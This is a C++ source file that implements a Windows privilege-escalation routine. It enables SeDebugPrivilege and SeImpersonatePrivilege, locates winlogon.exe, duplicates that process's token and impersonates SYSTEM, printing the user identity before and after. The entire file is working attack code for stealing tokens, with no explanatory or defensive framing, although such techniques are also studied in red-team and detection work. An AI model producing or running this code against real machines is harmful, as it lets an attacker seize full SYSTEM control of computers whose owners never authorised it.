#include "stuff.h"


bool EnablePrivilege(PCWSTR privName, bool enable) {
	HANDLE hToken;
	if (!::OpenProcessToken(::GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		std::cout << "[-] OpenProcessToken Failed: " << GetLastError() << std::endl;
		return false;
	}
	bool result = false;
	TOKEN_PRIVILEGES tp;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = enable ? SE_PRIVILEGE_ENABLED : 0;
	if (::LookupPrivilegeValue(nullptr, privName, &tp.Privileges[0].Luid)) {
		if (::AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr)) {
			result = ::GetLastError() == ERROR_SUCCESS;
			if (!result) {
				std::cout << "[-] AdjustTokenPrivileges Failed: " << GetLastError() << std::endl;
			}
		}
	}
	::CloseHandle(hToken);
	return result;
}


DWORD GetWinlogonPid() {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (::Process32First(snapshot, &entry) == TRUE)
	{
		while (::Process32Next(snapshot, &entry) == TRUE)
		{
			if (_wcsicmp(entry.szExeFile, L"winlogon.exe") == 0)
			{
				return entry.th32ProcessID;
			}
		}
	}
	return 0;
}


void GetCurrentUserInfo(HANDLE hToken) {
	HANDLE hThreadToken = hToken;
	DWORD dw = 0;
	dw = ::GetLastError();
	if (dw != 0) {
		std::wcout << L"[!] Error OpenProcessToken." << dw << std::endl;
		return;
	}
	BYTE buffer[1 << 12];
	LPTSTR StringSid = NULL;
	DWORD len;
	if (::GetTokenInformation(hThreadToken, TokenUser, buffer, sizeof(buffer), &len)) {
		auto data = (TOKEN_USER*)buffer;
		::ConvertSidToStringSid(data->User.Sid, &StringSid);
		std::wcout << L"[+] Current User SID: " << StringSid << std::endl;

		WCHAR accountName[64] = { 0 }, domainName[64] = { 0 };
		SID_NAME_USE use;
		DWORD accountNameSize = _countof(accountName);
		DWORD domainNameSize = _countof(domainName);
		::LookupAccountSid(nullptr, data->User.Sid, accountName, &accountNameSize, domainName, &domainNameSize, &use);
		std::wcout << L"[+] Current User: " << domainName << "\\" << accountName << std::endl;
	}
}


DWORD ImpersonateSystem() {
	HANDLE hCurrentToken = NULL;
	ImpersonateSelf(SecurityImpersonation);
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hCurrentToken)) {
		std::cout << "[-] OpenThreadToken Failed: " << GetLastError() << std::endl;
		return 1;
	}
	GetCurrentUserInfo(hCurrentToken);

	if (!EnablePrivilege(SE_DEBUG_NAME, TRUE)) {
		std::wcout << L"[!] Error enabling SeDebugPrivilege" << std::endl;
		return 1;
	}
	else {
		std::wcout << L"[+] SeDebugPrivilege Enabled" << std::endl;
	}

	if (!EnablePrivilege(SE_IMPERSONATE_NAME, TRUE)) {
		std::wcout << L"[!] Error enabling SeImpersonatePrivilege" << std::endl;
		return 1;
	}
	else {
		std::wcout << L"[+] SeImpersonatePrivilege Enabled" << std::endl;
	}

	DWORD systemPID = GetWinlogonPid();
	if (systemPID == 0) {
		std::wcout << L"[!] Error getting PID to Winlogon process" << std::endl;
		return 1;
	}

	HANDLE procHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, systemPID);
	DWORD dw = 0;
	dw = ::GetLastError();
	if (dw != 0) {
		std::wcout << L"[-] OpenProcess failed: " << dw << std::endl;
		return 1;
	}

	HANDLE hSystemTokenHandle;
	OpenProcessToken(procHandle, TOKEN_DUPLICATE, &hSystemTokenHandle);
	dw = ::GetLastError();
	if (dw != 0) {
		std::wcout << L"[-] OpenProcessToken failed: " << dw << std::endl;
		return 1;
	}

	HANDLE newTokenHandle;
	DuplicateTokenEx(hSystemTokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &newTokenHandle);
	dw = ::GetLastError();
	if (dw != 0) {
		std::wcout << L"[-] DuplicateTokenEx failed: " << dw << std::endl;
		return 1;
	}

	if (!::ImpersonateLoggedOnUser(newTokenHandle)) {
		return 1;
	}

	GetCurrentUserInfo(newTokenHandle);
	return 0;
}